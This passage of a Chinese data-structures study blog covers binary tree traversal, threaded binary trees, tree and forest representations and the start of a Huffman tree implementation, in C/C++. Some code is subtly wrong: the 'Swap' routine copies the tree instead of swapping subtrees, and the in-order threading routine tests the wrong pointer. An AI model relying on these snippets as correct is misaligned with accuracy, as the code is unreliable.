newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>销毁：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestoryBiTree</span><span class="params">(BiTree &amp;root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span>==root)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DestoryBiTree(root-&gt;lch);</span><br><span class="line">    DestoryBiTree(root-&gt;rch);</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line">    root = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历二叉树"><a href="#遍历二叉树" class="headerlink" title="遍历二叉树"></a>遍历二叉树</h3><p>样例：<img src="/2023/11/14/遍历例子.png" alt="image3"></p><h4 id="前序遍历-先根遍历"><a href="#前序遍历-先根遍历" class="headerlink" title="前序遍历(先根遍历)"></a>前序遍历(先根遍历)</h4><p>1.若二叉树为空，则返回；</p><p>若不空：</p><p>2.访问根结点；</p><p>3.前序遍历左子树</p><p>4.前序遍历右子树</p><p><strong>先根，再左，后右</strong></p><p>遍历结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 2 4 8 9 5 10 11 3 6 12 7</span><br></pre></td></tr></table></figure><p>前序遍历的第一个结点的是根结点，最后一个结点一定是叶子结点。</p><h4 id="中序遍历-中根遍历"><a href="#中序遍历-中根遍历" class="headerlink" title="中序遍历(中根遍历)"></a>中序遍历(中根遍历)</h4><p>1.若二叉树空，返回；</p><p>若不空：</p><p>2.中序遍历左子树；</p><p>3.访问根结点；</p><p>4.中序遍历右子树。</p><p><strong>先左，再根，后右</strong></p><p>遍历结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8 4 9 2 10 5 11 1 12 6 3 7</span><br></pre></td></tr></table></figure><p>第一个结点是最左边的结点，最后一个结点是最右边的结点，根结点位于左子树结点和右子树结点之间。</p><h4 id="后序遍历-后根遍历"><a href="#后序遍历-后根遍历" class="headerlink" title="后序遍历(后根遍历)"></a>后序遍历(后根遍历)</h4><p>1.若二叉树空，返回；</p><p>若不空：</p><p>2.中序遍历左子树；</p><p>3.后序遍历右子树；</p><p>4.访问根结点。</p><p><strong>先左，再右，后根</strong></p><p>遍历结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8 9 4 10 11 5 2 12 6 7 3 1</span><br></pre></td></tr></table></figure><p>后序遍历中最后一个结点是根结点</p><h3 id="树的遍历"><a href="#树的遍历" class="headerlink" title="树的遍历"></a>树的遍历</h3><h4 id="递归遍历"><a href="#递归遍历" class="headerlink" title="递归遍历"></a>递归遍历</h4><p>先序遍历：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)&#123;</span><br><span class="line">    visit(T-&gt;data);<span class="comment">//遍历操作，可以是打印该结点的值</span></span><br><span class="line">    PreOrder(T-&gt;lch);</span><br><span class="line">    PreOrder(T-&gt;rch);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中序遍历：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(T)&#123;</span><br><span class="line">    InOrder(T-&gt;lch);</span><br><span class="line">    visit(T-&gt;data);</span><br><span class="line">    InOrder(T-&gt;rch);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后序遍历：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(T)&#123;</span><br><span class="line">    PostOrder(T-&gt;lch);</span><br><span class="line">    PostOrder(T-&gt;rch);</span><br><span class="line">    visit(T-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="非递归遍历"><a href="#非递归遍历" class="headerlink" title="非递归遍历"></a>非递归遍历</h4><p>先序遍历：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 100</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrder</span><span class="params">(BiTNode *root)</span></span>&#123;</span><br><span class="line">  BiTNode *p,*BiNode[MAX];</span><br><span class="line">  <span class="type">int</span> top=<span class="number">0</span>;p=root;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">      <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">      BiNode[top]=p;</span><br><span class="line">      top++;</span><br><span class="line">      p=p-&gt;lch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(top&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      top--;</span><br><span class="line">      p=BiNode[top];</span><br><span class="line">      p=p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">while</span>(top&gt;<span class="number">0</span>||p!=<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中序遍历：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrder_N</span><span class="params">(BiTree root)</span></span>&#123;</span><br><span class="line">    BiTNode *p,*BiNode[MAX];</span><br><span class="line">    <span class="type">int</span> top=<span class="number">0</span>;p=root;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>(root))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;BiTree Empty!\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            BiNode[top]=p;</span><br><span class="line">            top++;</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(top&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            top--;</span><br><span class="line">            p=BiNode[top];</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            p=p-&gt;rch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(top&gt;<span class="number">0</span>||p!=<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后序遍历：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrder_N</span><span class="params">(BiTree root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BiTNode *p, *lastVisited = <span class="literal">NULL</span>;</span><br><span class="line">    BiTNode *stack[MAX];</span><br><span class="line">    <span class="type">int</span> top = <span class="number">0</span>; <span class="comment">// 栈顶位置下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = root;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span> || top &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            stack[++top] = p;</span><br><span class="line">            p = p-&gt;lch;</span><br><span class="line">        &#125;</span><br><span class="line">        p = stack[top];</span><br><span class="line">        <span class="comment">// 判断右子树是否已经访问过</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;rch == <span class="literal">NULL</span> || p-&gt;rch == lastVisited)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            lastVisited = p;</span><br><span class="line">            top--;</span><br><span class="line">            p = <span class="literal">NULL</span>; <span class="comment">// 置空，防止重复访问</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = p-&gt;rch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="二叉树的其他操作"><a href="#二叉树的其他操作" class="headerlink" title="二叉树的其他操作"></a>二叉树的其他操作</h4><p>判断树是否空：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">isEmpty</span><span class="params">(BiTree root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问结点操作：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">visit</span><span class="params">(TElemType data)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,data.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求结点数：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">NodesNum</span><span class="params">(BiTNode *b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num1,num2;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">NodesNum</span>(b-&gt;lch)+<span class="built_in">NodesNum</span>(b-&gt;rch)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求叶子结点数：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">LeafNodesNum</span><span class="params">(BiTNode *b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num1,num2;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (b-&gt;lch==<span class="literal">NULL</span>&amp;&amp;b-&gt;rch==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        num1=<span class="built_in">LeafNodesNum</span>(b-&gt;lch);</span><br><span class="line">        num2=<span class="built_in">LeafNodesNum</span>(b-&gt;rch);</span><br><span class="line">        <span class="keyword">return</span> (num1+num2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制树的操作：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Copy</span><span class="params">(BiTNode *b,BiTNode *&amp;t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>) t=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        t=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        t-&gt;data=b-&gt;data;</span><br><span class="line">        <span class="built_in">Copy</span>(b-&gt;lch, t-&gt;lch);</span><br><span class="line">        <span class="built_in">Copy</span>(b-&gt;rch,t-&gt;rch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交换左右子树：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Swap</span><span class="params">(BiTNode *b,BiTNode *&amp;t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>) t=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        t=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        t-&gt;data=b-&gt;data;</span><br><span class="line">        <span class="built_in">Swap</span>(b-&gt;lch, t-&gt;lch);</span><br><span class="line">        <span class="built_in">Swap</span>(b-&gt;rch,t-&gt;rch);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>求树的高度：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">height</span><span class="params">(BiTree t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> tl,tr;</span><br><span class="line">    <span class="keyword">if</span>(t==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tl=<span class="built_in">height</span>(t-&gt;lch);</span><br><span class="line">    tr=<span class="built_in">height</span>(t-&gt;rch);</span><br><span class="line">    <span class="keyword">if</span>(tl&gt;=tr) <span class="keyword">return</span> tl+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> tr+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><p>给定遍历序列是否可以确定树的唯一结构？</p><p>只给出一个序列，无法确定树的唯一结构</p><p>给出前序和后序序列，无法确定唯一的二叉树</p><p>给出中序和后序序列，可以确定唯一的二叉树</p><p>给出中序和前序序列，可以确定唯一的二叉树</p><p>问题：给出前序和中序序列，如何构建二叉树？</p><p>代码实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateTree</span><span class="params">(BiTree &amp;T,<span class="type">int</span> root,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">char</span> *m,<span class="type">char</span> *n)</span>   <span class="comment">//创建二叉树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T=(BiNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiNode));</span><br><span class="line">    <span class="keyword">if</span>(start&gt;end)</span><br><span class="line">    &#123;</span><br><span class="line">        T=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i=start;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;end&amp;&amp;n[i]!=m[root])</span><br><span class="line">        i++;</span><br><span class="line">    T-&gt;data=n[i];</span><br><span class="line">    <span class="built_in">CreateTree</span>(T-&gt;lch,root+<span class="number">1</span>,start,i<span class="number">-1</span>,m,n);</span><br><span class="line">    <span class="built_in">CreateTree</span>(T-&gt;rch,root+<span class="number">1</span>+i-start,i+<span class="number">1</span> ,end,m,n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p>既可以指示前驱又可以指示后继的双链结构的二叉树称为线索二叉树</p><p>若结点有左子树，则lch指示左孩子，否则指示其前驱</p><p>若结点有右子树，则rch指示其右孩子，否则指示其后继</p><h4 id="结点结构"><a href="#结点结构" class="headerlink" title="结点结构"></a>结点结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lch</span>,*<span class="title">rch</span>;</span></span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;threadbithptr,*BiThrTree;</span><br></pre></td></tr></table></figure><p>ltag=0 lch指向左孩子 ltag=1 lch指向前驱</p><p>ltag=0 rch指向右孩子 ltag=1 rch指向后继</p><h4 id="二叉树的线索化"><a href="#二叉树的线索化" class="headerlink" title="二叉树的线索化"></a>二叉树的线索化</h4><p>存储结构：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span> *lch,*rch;</span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;threadbithptr,*BiThrTree;</span><br><span class="line">BiThrTree pre=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中序线索化：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InThreading</span><span class="params">(BiThrTree p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        <span class="built_in">InThreading</span>(p-&gt;lch);</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;lch)&#123;</span><br><span class="line">            p-&gt;ltag=<span class="number">1</span>;</span><br><span class="line">            p-&gt;lch=pre;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;rch)&#123;</span><br><span class="line">            pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">            pre-&gt;rch=p;</span><br><span class="line">        &#125;</span><br><span class="line">        pre=p;</span><br><span class="line">        <span class="built_in">InThreading</span>(p-&gt;rch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrderThreading</span><span class="params">(BiThrTree &amp;Thrt,BiThrTree T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(Thrt=(threadbithptr*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(threadbithptr))))&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Thrt-&gt;ltag=<span class="number">0</span>;</span><br><span class="line">    Thrt-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    Thrt-&gt;rch=Thrt;</span><br><span class="line">    <span class="keyword">if</span>(!T)&#123;</span><br><span class="line">        Thrt-&gt;lch=Thrt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Thrt-&gt;lch=T;</span><br><span class="line">        pre=Thrt;</span><br><span class="line">        <span class="built_in">InThreading</span>(T);</span><br><span class="line">        pre-&gt;rch=Thrt;</span><br><span class="line">        pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">        Thrt-&gt;rch=pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中序线索树中查找结点*p的后继：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">threadbithptr* <span class="title">InOrderNext</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    threadbithptr *q;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;rtag==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        q=p-&gt;rch;</span><br><span class="line">        <span class="keyword">while</span>(q-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            q=q-&gt;lch;</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TraverseInthread</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            p=<span class="built_in">InOrderNext</span>(p);</span><br><span class="line">        &#125;<span class="keyword">while</span>(p!=<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中序线索树中查找结点*p的前驱：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">threadbithptr* <span class="title">InOrderPre</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    threadbithptr *q;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;ltag==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;lch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q=p-&gt;lch;</span><br><span class="line">        <span class="keyword">while</span>(q-&gt;rtag==<span class="number">0</span>)</span><br><span class="line">            q=q-&gt;rch;</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历中序线索二叉树的非递归算法：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">TraverseInthread</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            p=<span class="built_in">InOrderNext</span>(p);</span><br><span class="line">        &#125;<span class="keyword">while</span>(p!=<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="树和森林"><a href="#树和森林" class="headerlink" title="树和森林"></a>树和森林</h3><h4 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h4><h5 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h5><p>采用一组连续空间存储树的结点，通过保存每个结点的双亲结点的位置，表示树中结点关系的位置结构。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">PTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="type">int</span> parent;</span><br><span class="line">&#125;PTNode;</span><br></pre></td></tr></table></figure><h5 id="孩子链表表示法"><a href="#孩子链表表示法" class="headerlink" title="孩子链表表示法"></a>孩子链表表示法</h5><p>对树的每个结点用线性链表存储它的孩子结点。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CTNode</span>&#123;</span><br><span class="line">  <span class="type">int</span> child;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">CTNode</span> *next;</span><br><span class="line">&#125;*ChildPtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">  <span class="type">int</span> parent;</span><br><span class="line">    ChildPtr firstchild;</span><br><span class="line">&#125;CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  CTBox nodes[MAX];</span><br><span class="line">  <span class="type">int</span> n,r;</span><br><span class="line">&#125;CTree;</span><br></pre></td></tr></table></figure><h5 id="带双亲的孩子链表表示法"><a href="#带双亲的孩子链表表示法" class="headerlink" title="带双亲的孩子链表表示法"></a>带双亲的孩子链表表示法</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CTNode</span>&#123;</span><br><span class="line">  <span class="type">int</span> child;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">CTNode</span> *next;</span><br><span class="line">&#125;*ChildPtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">  <span class="type">int</span> parent;</span><br><span class="line">    ChildPtr firstchild;</span><br><span class="line">&#125;CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  CTBox nodes[MAX];</span><br><span class="line">  <span class="type">int</span> n,r;</span><br><span class="line">&#125;CTree;</span><br></pre></td></tr></table></figure><h5 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CSNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">CSNode</span> *firstchild,*firstbrother;</span><br><span class="line">&#125;CSNode,*CSTree;</span><br></pre></td></tr></table></figure><h4 id="树、森林与二叉树的转化"><a href="#树、森林与二叉树的转化" class="headerlink" title="树、森林与二叉树的转化"></a>树、森林与二叉树的转化</h4><h5 id="树到二叉树"><a href="#树到二叉树" class="headerlink" title="树到二叉树"></a>树到二叉树</h5><p>1)在所有兄弟结点之间加一条连线。</p><p>2)对每个结点，除了保留与其长子的连线外，去掉该结点与其他孩子的连线。</p><h5 id="森林到二叉树"><a href="#森林到二叉树" class="headerlink" title="森林到二叉树"></a>森林到二叉树</h5><p>1)将森林中的每一棵树转化为二叉树</p><p>2)将各二叉树的根结点视为兄弟连在一起</p><h4 id="树的遍历-1"><a href="#树的遍历-1" class="headerlink" title="树的遍历"></a>树的遍历</h4><p>一般不中序遍历</p><p>两条路径：从左到右、从上到下</p><p><strong>树的前序遍历</strong>与转换成<strong>二叉树的前序遍历</strong>相同</p><p><strong>树的后序遍历</strong>与转换成<strong>二叉树的中序遍历</strong>相同</p><h3 id="赫夫曼树及其应用"><a href="#赫夫曼树及其应用" class="headerlink" title="赫夫曼树及其应用"></a>赫夫曼树及其应用</h3><p>基本概念</p><p>路径长度：路径上边的个数</p><p>树的路径长度：从根结点出发，到所有结点的路径长度之和</p><p>结点的带权路径长度：结点到根结点的长度与权重的乘积</p><p>树的带权路径长度：所有叶子结点的带权路径长度之和</p><h4 id="赫夫曼树的定义"><a href="#赫夫曼树的定义" class="headerlink" title="赫夫曼树的定义"></a>赫夫曼树的定义</h4><p>最优二叉树，给定叶结点权重，具有最小带权路径长度的二叉树。</p><h4 id="构造赫夫曼树-赫夫曼算法"><a href="#构造赫夫曼树-赫夫曼算法" class="headerlink" title="构造赫夫曼树(赫夫曼算法)"></a>构造赫夫曼树(赫夫曼算法)</h4><p>基本思想：使权值大的叶子结点尽量靠近根节点，而使权值小的叶子结点尽量远离根结点</p><p>将给定的一些叶子结点中取出两个最小的叶子作为一个结点的左孩子和右孩子，然后将它们的权值相加，从剩下的叶子中寻找最小的结点作为上面结点的兄弟，重复此操作。</p><p>n个叶结点，按上述操作，构造的树中含有2n-1个结点。</p><p><img src="/2023/11/14/赫夫曼树构造.png" alt="image4"></p><p>huffman算法实现：</p><p>主函数先给n，m赋值。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">    <span class="type">int</span> lch,rch,parent;</span><br><span class="line">&#125;hufmtree;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateHuffmanTree</span><span class="params">(hufmtree tree[])</span></span>&#123;<span class="comment">//初始化</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        tree[i].weight=<span class="number">0.0</span>;</span><br><span class="line">        tree[i].lch=<span class="number">-1</span>;</span><br><span class="line">        tree[i].rch=<span class="number">-1</span>;</span><br><span class="line">        tree[i].parent=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InputWeight</span><span class="params">(hufmtree tree[])</span></span>&#123;</span><br><span class="line">    <span class="type">float</span> w;</span><br><span class="line">    <span class="type">float</span> small1,small2,f;</span><br><span class="line">    <span class="type">int</span> i,j,p1,p2;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n输入第%d个权值:&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;w);</span><br><span class="line">        tree[i].weight=w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=n;i&lt;m;i++)&#123;<span class="comment">//把合并后的结点放入n～m向量</span></span><br><span class="line">        p1=<span class="number">0</span>;p2=<span class="number">0</span>;    <span class="comment">//两个根结点在tree中的下标</span></span><br><span class="line">        small1=MAXFLOAT;<span 